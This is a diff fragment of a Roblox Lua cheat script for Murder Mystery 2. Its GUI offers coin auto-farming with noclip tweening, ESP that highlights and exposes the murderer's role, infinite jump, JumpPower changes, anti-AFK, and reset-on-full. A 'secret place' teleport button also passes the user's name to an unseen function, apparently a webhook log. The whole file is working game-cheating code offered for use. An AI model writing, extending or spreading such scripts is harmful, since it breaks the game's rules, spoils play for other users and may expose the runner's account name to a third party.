+    local list = {}
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not VS[obj] then
+            table.insert(list, obj)
+        end
+    end
+    return list
+end
+
+local function updESP()
+    if not ES then
+        for _, h in pairs(HL) do
+            if h then pcall(function() h:Destroy() end) end
+        end
+        HL = {}
+        return
+    end
+    for _, pl in ipairs(P:GetPlayers()) do
+        if pl ~= lp and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
+            local role = getRole(pl)
+            local col = Color3.fromRGB(40, 255, 80)
+            if role == "Murderer" then col = Color3.fromRGB(255, 40, 40)
+            elseif role == "Sheriff" or role == "Hero" then col = Color3.fromRGB(40, 120, 255) end
+            local h = HL[pl]
+            if not h or not h.Parent then
+                h = Instance.new("Highlight")
+                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                h.FillTransparency = 0.45
+                h.OutlineTransparency = 0.2
+                h.Parent = pl.Character
+                HL[pl] = h
+            end
+            h.FillColor = col
+            h.OutlineColor = col
+            h.Adornee = pl.Character
+        end
+    end
+end
+
+task.spawn(function()
+    while true do
+        task.wait(1)
+        pcall(updESP)
+    end
+end)
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "mm2FarmLight"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = pg
+
+local main = Instance.new("Frame")
+main.Size = UDim2.fromOffset(420, 420)
+main.Position = UDim2.new(0.5, -210, 0.14, 0)
+main.BackgroundColor3 = Color3.fromRGB(14, 7, 4)
+main.Active = true
+main.Draggable = true
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 2.4
+stroke.Color = Color3.fromRGB(255, 120, 30)
+stroke.Parent = main
+
+task.spawn(function()
+    local t = 0
+    while main.Parent do
+        t = t + task.wait(0.03)
+        local p = (math.sin(t * 2.2) + 1) / 2
+        stroke.Color = Color3.fromRGB(180 + p * 75, 60 + p * 60, 10 + p * 20)
+        stroke.Thickness = 2 + p * 1.2
+    end
+end)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -90, 0, 34)
+title.Position = UDim2.new(0, 12, 0, 6)
+title.BackgroundTransparency = 1
+title.Text = "mm2 coins farm"
+title.TextColor3 = Color3.fromRGB(255, 150, 50)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = main
+
+local placeTag = Instance.new("TextLabel")
+placeTag.Size = UDim2.fromOffset(70, 22)
+placeTag.Position = UDim2.new(1, -110, 0, 10)
+placeTag.BackgroundTransparency = 1
+placeTag.Font = Enum.Font.GothamBold
+placeTag.TextSize = 12
+placeTag.Parent = main
+if isHidden then
+    placeTag.Text = "HIDDEN"
+    placeTag.TextColor3 = Color3.fromRGB(40, 255, 90)
+else
+    placeTag.Text = "ORIGINAL"
+    placeTag.TextColor3 = Color3.fromRGB(255, 50, 50)
+end
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.fromOffset(28, 28)
+close.Position = UDim2.new(1, -36, 0, 8)
+close.BackgroundColor3 = Color3.fromRGB(170, 45, 20)
+close.Text = "X"
+close.TextColor3 = Color3.new(1,1,1)
+close.Font = Enum.Font.GothamBold
+close.TextSize = 14
+close.Parent = main
+Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+local side = Instance.new("Frame")
+side.Size = UDim2.new(0, 105, 1, -50)
+side.Position = UDim2.new(0, 8, 0, 44)
+side.BackgroundColor3 = Color3.fromRGB(26, 12, 6)
+side.Parent = main
+Instance.new("UICorner", side).CornerRadius = UDim.new(0, 8)
+
+local content = Instance.new("ScrollingFrame")
+content.Size = UDim2.new(1, -125, 1, -54)
+content.Position = UDim2.new(0, 120, 0, 44)
+content.BackgroundColor3 = Color3.fromRGB(18, 9, 5)
+content.BorderSizePixel = 0
+content.ScrollBarThickness = 3
+content.CanvasSize = UDim2.new(0, 0, 0, 520)
+content.Parent = main
+Instance.new("UICorner", content).CornerRadius = UDim.new(0, 8)
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 6)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = content
+
+local function clear()
+    for _, c in ipairs(content:GetChildren()) do
+        if not c:IsA("UIListLayout") then c:Destroy() end
+    end
+end
+
+local function mkBtn(txt, y, parent)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -12, 0, 32)
+    b.Position = UDim2.new(0, 6, 0, y)
+    b.BackgroundColor3 = Color3.fromRGB(48, 22, 8)
+    b.Text = txt
+    b.TextColor3 = Color3.fromRGB(255, 200, 140)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.Parent = parent
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+    return b
+end
+
+local function mkToggle(txt, parent, state, cb)
+    local st = state
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -16, 0, 32)
+    b.BackgroundColor3 = st and Color3.fromRGB(170, 75, 20) or Color3.fromRGB(38, 16, 8)
+    b.Text = txt .. (st and " : ON" or " : OFF")
+    b.TextColor3 = Color3.new(1,1,1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.Parent = parent
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+    b.MouseButton1Click:Connect(function()
+        st = not st
+        b.Text = txt .. (st and " : ON" or " : OFF")
+        b.BackgroundColor3 = st and Color3.fromRGB(170, 75, 20) or Color3.fromRGB(38, 16, 8)
+        cb(st)
+    end)
+    return b
+end
+
+local function showAF()
+    clear()
+    content.CanvasSize = UDim2.new(0, 0, 0, 500)
+
+    mkToggle("AutoFarm", content, AF, function(v)
+        AF = v
+        if v then CL, VS = 0, {} end
+    end).LayoutOrder = 1
+
+    mkToggle("Anti AFK", content, AK, function(v) AK = v end).LayoutOrder = 2
+    mkToggle("Reset on Full", content, RF, function(v) RF = v end).LayoutOrder = 3
+    mkToggle("Performance", content, PM, function(v) if v then epm() end end).LayoutOrder = 4
+    mkToggle("Noclip", content, NOCLIP, function(v) NOCLIP = v setNoclip(v) end).LayoutOrder = 5
+    mkToggle("No Render", content, NORENDER, function(v) setNoRender(v) end).LayoutOrder = 6
+
+    local modeLbl = Instance.new("TextLabel")
+    modeLbl.Size = UDim2.new(1, -16, 0, 18)
+    modeLbl.BackgroundTransparency = 1
+    modeLbl.Text = "Mode: " .. MODE
+    modeLbl.TextColor3 = Color3.fromRGB(255, 180, 100)
+    modeLbl.Font = Enum.Font.GothamBold
+    modeLbl.TextSize = 12
+    modeLbl.LayoutOrder = 7
+    modeLbl.Parent = content
+
+    for i, m in ipairs({"Normal", "Strategy"}) do
+        local b = Instance.new("TextButton")
+        b.Size = UDim2.new(1, -16, 0, 28)
+        b.BackgroundColor3 = (MODE == m) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(38, 16, 8)
+        b.Text = m
+        b.TextColor3 = Color3.new(1,1,1)
+        b.Font = Enum.Font.GothamBold
+        b.TextSize = 12
+        b.LayoutOrder = 7 + i
+        b.Parent = content
+        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
+        b.MouseButton1Click:Connect(function()
+            MODE = m
+            modeLbl.Text = "Mode: " .. MODE
+            for _, c in ipairs(content:GetChildren()) do
+                if c:IsA("TextButton") and (c.Text == "Normal" or c.Text == "Strategy") then
+                    c.BackgroundColor3 = (c.Text == MODE) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(38, 16, 8)
+                end
+            end
+        end)
+    end
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -16, 0, 18)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = "Speed: " .. SP
+    lbl.TextColor3 = Color3.fromRGB(230, 180, 120)
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 12
+    lbl.LayoutOrder = 10
+    lbl.Parent = content
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(1, -16, 0, 28)
+    box.BackgroundColor3 = Color3.fromRGB(32, 14, 6)
+    box.Text = tostring(SP)
+    box.TextColor3 = Color3.new(1,1,1)
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 13
+    box.LayoutOrder = 11
+    box.Parent = content
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 5)
+    box.FocusLost:Connect(function(e)
+        if e then
+            local n = tonumber(box.Text)
+            SP = n and math.clamp(n, 1, 300) or SP
+            box.Text = tostring(SP)
+            lbl.Text = "Speed: " .. SP
+        end
+    end)
+
+    local cnt = Instance.new("TextLabel")
+    cnt.Size = UDim2.new(1, -16, 0, 20)
+    cnt.BackgroundTransparency = 1
+    cnt.Text = "Collected: 0"
+    cnt.TextColor3 = Color3.fromRGB(255, 190, 100)
+    cnt.Font = Enum.Font.Gotham
+    cnt.TextSize = 12
+    cnt.LayoutOrder = 12
+    cnt.Parent = content
+    task.spawn(function()
+        while cnt.Parent do
+            cnt.Text = "Collected: " .. CL
+            task.wait(0.5)
+        end
+    end)
+
+    -- TP Secret button
+    local tpBtn = Instance.new("TextButton")
+    tpBtn.Size = UDim2.new(1, -16, 0, 34)
+    tpBtn.BackgroundColor3 = Color3.fromRGB(150, 55, 15)
+    tpBtn.Text = "TP Secret Place"
+    tpBtn.TextColor3 = Color3.new(1,1,1)
+    tpBtn.Font = Enum.Font.GothamBold
+    tpBtn.TextSize = 12
+    tpBtn.LayoutOrder = 13
+    tpBtn.Parent = content
+    Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 6)
+    tpBtn.MouseButton1Click:Connect(function()
+        pcall(function()
+            TeleportService:Teleport(HIDDEN_ID, lp)
+        end)
+        sw("Teleporting to secret place by **" .. lp.Name .. "**", false)
+    end)
+end
+
+local function showESP()
+    clear()
+    content.CanvasSize = UDim2.new(0, 0, 0, 160)
+    mkToggle("Role ESP", content, ES, function(v)
+        ES = v
+        if not v then
+            for _, h in pairs(HL) do if h then pcall(function() h:Destroy() end) end end
+            HL = {}
+        end
+    end).LayoutOrder = 1
+
+    local info = Instance.new("TextLabel")
+    info.Size = UDim2.new(1, -16, 0, 60)
+    info.BackgroundTransparency = 1
+    info.Text = "Murderer = Red\nSheriff = Blue\nInnocent = Green"
+    info.TextColor3 = Color3.fromRGB(255, 190, 140)
+    info.Font = Enum.Font.Gotham
+    info.TextSize = 12
+    info.TextYAlignment = Enum.TextYAlignment.Top
+    info.LayoutOrder = 2
+    info.Parent = content
+end
+
+local function showMove()
+    clear()
+    content.CanvasSize = UDim2.new(0, 0, 0, 220)
+    mkToggle("Inf Jump", content, IJ, function(v) IJ = v end).LayoutOrder = 1
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -16, 0, 18)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = "JumpPower: " .. JP
+    lbl.TextColor3 = Color3.fromRGB(230, 180, 120)
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 12
+    lbl.LayoutOrder = 2
+    lbl.Parent = content
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(1, -16, 0, 28)
+    box.BackgroundColor3 = Color3.fromRGB(32, 14, 6)
+    box.Text = tostring(JP)
+    box.TextColor3 = Color3.new(1,1,1)
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 13
+    box.LayoutOrder = 3
+    box.Parent = content
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 5)
+    box.FocusLost:Connect(function(e)
+        if e then
+            local n = tonumber(box.Text)
+            JP = n and math.clamp(n, 10, 300) or JP
+            box.Text = tostring(JP)
+            lbl.Text = "JumpPower: " .. JP
+            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
+                lp.Character.Humanoid.JumpPower = JP
+            end
+        end
+    end)
+end
+
+local tabs = {
+    {name = "AutoFarm", fn = showAF},
+    {name = "ESP", fn = showESP},
+    {name = "Movement", fn = showMove}
+}
+
+for i, tab in ipairs(tabs) do
+    local b = mkBtn(tab.name, (i-1)*38 + 8, side)
+    b.MouseButton1Click:Connect(function()
+        for _, c in ipairs(side:GetChildren()) do
+            if c:IsA("TextButton") then c.BackgroundColor3 = Color3.fromRGB(48, 22, 8) end
+        end
+        b.BackgroundColor3 = Color3.fromRGB(190, 85, 25)
+        tab.fn()
+    end)
+end
+
+showAF()
+local first = side:FindFirstChildOfClass("TextButton")
+if first then first.BackgroundColor3 = Color3.fromRGB(190, 85, 25) end
+
+UIS.JumpRequest:Connect(function()
+    if IJ and lp.Character and lp.Character:FindFirstChild("Humanoid") then
+        lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end)
+
+lp.CharacterAdded:Connect(function(ch)
+    task.wait(0.3)
+    local hum = ch:FindFirstChild("Humanoid")
+    if hum then hum.JumpPower = JP end
+    if NOCLIP then setNoclip(true) end
+end)
+
+local coinRemote = RPS:FindFirstChild("Remotes")
+if coinRemote then
+    coinRemote = coinRemote:FindFirstChild("Gameplay")
+    if coinRemote then coinRemote = coinRemote:FindFirstChild("CoinCollected") end
+end
+if coinRemote then
+    coinRemote.OnClientEvent:Connect(function(_, cur, max)
+        if cur >= max and RF and lp.Character then
+            lp.Character:BreakJoints()
+        end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        if AF then
+            local ch = lp.Character
+            local root = ch and ch:FindFirstChild("HumanoidRootPart")
+            local hum = ch and ch:FindFirstChild("Humanoid")
+            if root and hum then
+                if NOCLIP or AF then setNoclip(true) end
+                hum.PlatformStand = false
+                root.Anchored = false
+
+                local murd = getMurderer()
+                local murdRoot = murd and murd.Character and murd.Character:FindFirstChild("HumanoidRootPart")
+
+                local closest, dist = nil, math.huge
+                for _, obj in ipairs(getCoins()) do
+                    local d = (obj.Position - root.Position).Magnitude
+                    if d < dist and d < RG then
+                        if MODE == "Strategy" and murdRoot then
+                            if (obj.Position - murdRoot.Position).Magnitude >= 45 then
+                                closest, dist = obj, d
+                            end
+                        else
+                            closest, dist = obj, d
+                        end
+                    end
+                end
+
+                if closest then
+                    local t = math.max(dist / SP, 0.1)
+                    local tw = TS:Create(root, TweenInfo.new(t, Enum.EasingStyle.Linear), {
+                        CFrame = CFrame.new(closest.Position + Vector3.new(0, 2.5, 0))
+                    })
+                    tw:Play()
+                    tw.Completed:Wait()
+                    if closest and closest.Parent then
+                        VS[closest] = true
+                        CL = CL + 1
+                    end
+                end
+                task.wait(0.06)
+            else
+                task.wait(0.4)
+            end
+        else
+            if not NOCLIP then setNoclip(false) end
+            task.wait(0.5)
+        end
+    end
+end)
+
+RS.Stepped:Connect(function()
+    if NOCLIP or AF then setNoclip(true) end
+end)
+
+lp.Idled:Connect(function()
+    if AK then
+        VU:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        VU:Button2Up(Vector2.new(), workspace.CurrentCamera.CFrame)
+    end
+end)
+
+print("[mm2 coins farm] Loaded | " .. (isHidden and "HIDDEN" or "ORIGINAL"))
